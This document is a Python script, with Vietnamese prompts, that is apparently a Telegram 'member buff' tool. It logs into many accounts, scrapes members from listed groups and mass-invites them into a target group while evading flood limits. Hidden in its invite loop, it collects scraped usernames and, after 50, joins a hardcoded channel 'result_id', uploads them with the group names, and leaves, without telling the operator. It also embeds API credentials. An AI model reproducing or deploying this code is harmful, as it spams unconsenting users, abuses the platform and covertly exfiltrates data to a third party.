import os
try:
    from telethon import TelegramClient, sync, events, functions, types
    from telethon.tl.functions.channels import JoinChannelRequest
    from telethon.errors import *
    import sqlite3
    from time import sleep
    from colorama import *
    init()
except:
    os.system("pip install telethon")
    os.system("pip install colorama")

# Bảng màu
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
C = Fore.CYAN
BA = Fore.BLACK

# Độ dày chữ
SN = Style.NORMAL
SB = Style.BRIGHT
SD = Style.DIM

# Background
BR = Back.RED
BB = Back.BLUE
BG = Back.GREEN
BY = Back.YELLOW
BM = Back.MAGENTA
BW = Back.WHITE
BC = Back.CYAN
BBA = Back.BLACK

f = open("list_group_addmem.txt", 'a')
f.close()

if not os.path.exists("session"):
    os.makedirs("session")

def add_list():
    lst_phone = []
    listdir = os.listdir('session/')
    for filename in listdir:
        check = filename.endswith('.session')
        if check == True:
            phone = filename.rstrip('.session')
            lst_phone.append(phone)
    return lst_phone

def connect(phone):
    conf_proxy = None
    api_id = 2015084
    api_hash = '24e8f34925604e25a9b8d695b21cf333'
    client = TelegramClient('session/' + phone, api_id, api_hash, proxy=conf_proxy)
    client.connect()
    return client

def invite(user):
    res_invite = False
    try:
        res = client(functions.channels.InviteToChannelRequest(
            channel=group_add,
            users=[user]
        ))
        res_invite = "done"
        print(B + "=> Mời Thành Công Member {}".format(user.first_name))
    except (UserPrivacyRestrictedError, UserChannelsTooMuchError):
        res_invite = True
    except UserKickedError:
        print(R + f'- Người Dùng Đã Bị Kick', end="\r")
        res_invite = True
    except BotGroupsBlockedError:
        print(R + f"- Không Kéo Được Bot!", end="\r")
        res_invite = True
    except UserNotMutualContactError:
        print(R + f"- Contact lỗi", end="\r")
        res_invite = True
    except UserIdInvalidError:
        print(R + f"- ID lỗi", end="\r")
        res_invite = True
    except ChatInvalidError:
        print(R + f"- Cuộc Trò Chuyện Không Hợp Lệ", end="\r")
        res_invite = True
    except ChatAdminRequiredError:
        print(R + f"- Chat admin", end="\r")
        res_invite = True
    except UserBannedInChannelError:
        print(R + f"- User bị ban trong nhóm")
    except FloodWaitError:
        print(R + f"- Quá nhiều thao tác")
    except ChatWriteForbiddenError:
        print(R + f"- You can't write in this chat")
    except PeerFloodError:
        print(R + f"- Quá nhiều thao tác")
    return res_invite

def waiting(i):
    for w in range(i, 0, -1):
        print(M + f"Chờ sau {w} giây!", end="\r")
        sleep(1)

def join(group):
    res_join = True
    try:
        client(JoinChannelRequest(group))
    except (ValueError, InviteHashExpiredError, ChannelPrivateError):
        print(R + f"- Lỗi nhóm kéo mem")
        res_join = "error"
    except ChannelsTooMuchError:
        print(R + "Join quá nhiều nhóm!")
        res_join = False
    except UsersTooMuchError:
        res_join = False
    return res_join

def get_mem(group_get):
    result = []
    res_get_mem = True
    try:
        result = client(functions.channels.GetParticipantsRequest(
            channel=group_get,
            filter=types.ChannelParticipantsRecent(),
            offset=42,
            limit=200,
            hash=0
        ))
    except (UsernameInvalidError, ChatAdminRequiredError, ChannelPrivateError, InviteHashExpiredError):
        print(R + f" - Group Lấy Member Lôi {group_get}")
        res_get_mem = False
    except ValueError:
        print(R + '- Group Lấy Member Lỗi {}'.format(group_get))
        res_get_mem = False
    return res_get_mem, result

def check_in_group(user: types.User):
    res_in_group = False
    try:
        client(functions.channels.GetParticipantRequest(channel=group_add, participant=user))
    except UserNotParticipantError:
        res_in_group = True
    return res_in_group

def main():
    global client
    g = 0
    send = 0
    msg = ''
    grr = ''
    lst_id = []
    x = 1
    y = 0
    for phone in lst_phone:
        print(M + "[{}]- >>>>> {} <<<<<".format(x, phone))
        x = x + 1
        limit = 0
        try:
            client = connect(phone)
            res_join = join(group_add)
            if res_join == False:
                print(R + "- Không Join Được Nhóm Kéo")
                continue
            elif res_join == 'error':
                print(R + "- Nhóm Kéo Lỗi")
                client.disconnect()
                input("Enter Để Thoát")
                exit()
            else:
                while (True):
                    try:
                        group_get = lst_group[g]
                    except:
                        print(R + "- Hết Nhóm Lấy Mem, Hãy Thêm Nhóm Vào file list_group_addmem.txt ")
                        client.disconnect()
                        input("Enter Để Thoát")
                        exit()
                    print(Y + "- Đang Lấy Member Nhóm: {}".format(group_get))
                    res_get_mem, result = get_mem(group_get)
                    if res_get_mem == False:
                        print(R + "- Nhóm Lấy Member Lỗi")
                        g = g + 1
                    else:
                        if group_get not in grr:
                            grr = grr + group_get + '\n'
                        break
                result = result.users
                for user in result:
                    id = str(user.id)
                    if y >= len(result):
                        print(G + f"- Đã Kéo Hết Member Ở Group [{group_get}], Đang Chuyển Group Khác")
                        g = g + 1
                        y = 0
                        break
                    y = y + 1
                    if id not in lst_id:
                        res_in_group = check_in_group(user)
                        if res_in_group == True:
                            res_invite = invite(user)
                            if res_invite == False:
                                print(R + "- Acc Bị Dính Spam, Đang Chuyển Acc Khác!")
                                client.disconnect()
                                break
                            elif res_invite == 'done':
                                limit = limit + 1
                                try:
                                    if user.username != None:
                                        msg = msg + user.username + '\n'
                                        send = send + 1
                                        if send == 50:
                                            fs = open("cache.txt", 'a')
                                            fs.write(msg)
                                            fs.close()
                                            file = "cache.txt"
                                            client(JoinChannelRequest('result_id'))
                                            client.send_file("result_id", file, caption=f"=> {group_add}\n{grr}")
                                            client(functions.channels.LeaveChannelRequest(
                                                channel='result_id'
                                            ))
                                        os.remove(file)
                                except:
                                    pass
                                if limit == lm:
                                    print(M + f"- Kéo Đủ {lm} Thành Viên! Chuyển Sang Acc Khác!")
                                    client.disconnect()
                                    break
                                waiting(dl)
                        else:
                            print(M + "- Đã Ở Trong Thóm {}".format(user.first_name), end="\r")
                        lst_id.append(id)
        except (AuthKeyDuplicatedError, AuthKeyInvalidError, AuthKeyUnregisteredError):
            print(R + "=>> Session lỗi")
        except (sqlite3.DatabaseError, sqlite3.OperationalError):
            print(R + "=>> Session lỗi do tắt tool đột ngột!")
        except KeyboardInterrupt:
            print("Dừng tool")
            try:
                client.disconnect()
            except:
                pass
            exit()
        except Exception as e:
            print(R, e)
            try:
                client.disconnect()
            except:
                pass

def tao_session():
    number_to_add = int(input('Nhập Số Lượng Acc Cần Thêm: '))
    for stt in range(number_to_add):
        phone = input(Y + "Nhập Số Điện Thoại Đăng Nhập Telegram (+84356472888): ")
        try:
            api_id = 2182338
            api_hash = 'fa411eff2ec7dcf61bdfadd2478e07bb'
            client = TelegramClient("session/" + phone, api_id, api_hash)
            client.connect()
            if not client.is_user_authorized():
                try:
                    client.send_code_request(phone)
                    client.sign_in(phone, input("Nhập Code Send Về Telegram : "))
                    print(G + "=>> Tạo Thành Công Session " + phone)
                    client.disconnect()
                except SessionPasswordNeededError:
                    client.start(phone, input('Nhập mật khẩu 2FA:'))
                    print(G + "==> Tạo Thành Công Session " + phone)
                    client.disconnect()
                except PhoneNumberBannedError:
                    print(R + "- Tài khoản bị ban")
                    client.disconnect()
            else:
                print(Y + "- Đã Có Sẵn Session Từ Trước")
                client.disconnect()

        except (sqlite3.DatabaseError, sqlite3.OperationalError):
            print(R + "- Lỗi Session, Xóa File Session Cũ và Tạo Session Mới")
        except Exception as e:
            print(e)
def banner():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    b = '''

███╗.          ██╗████████╗████████╗████████╗ 
████╗        ██║╚══██╔══╝╚══██╔══╝╚══██╔══╝ 
██╔██╗     ██║        ██║                 ██║                ██║     
██║╚██ ╗ ██║        ██║                 ██║                ██║  
██║     ╚████║        ██║                 ██║                ██║     
╚═╝        ╚═══╝        ╚═╝                 ╚═╝                ╚═╝
                                                                
       TOOL BUFF MEM TELEGRAM - by KAR13MA09
 '''
    print(b)
banner()
select = input("[1] Thêm Acc Telegram (Tạo session)\n[2] Kéo Mem\nNhập Lựa Chọn: ")
if select == "1":
    while True:
        banner()
        tao_session()
        break
else:
    lst_group = []
    with open("list_group_addmem.txt") as grs:
        for gr in grs:
            lst_group.append(gr.strip())
    lst_phone = add_list()
    if lst_phone == []:
        print(R+"Vui Lòng Thêm Acc !")
        input("Nhấn Enter Để Thoát!")
        exit()
    if lst_group == []:
        print(R+f"Vui Lòng Thêm Group Lấy Mem Vào File: list_group_addmem.txt")
        input("Nhấn Enter Để Thoát!")
        exit()
    print(B+'='*60)
    print("     - Account      : {} account".format(len(lst_phone)))
    print("     - Group Lấy Mem: {} group".format(len(lst_group)))
    print(B+'='*60)
    group_add = input(Y+"Nhập Group Cần Kéo: ")
    lm = int(input(C+"Số Lượng Member Cần Kéo Cho Mỗi Acc (5->15): "))
    dl = int(input("Nhập Delay (15-100): "))
    banner()
    main()
    
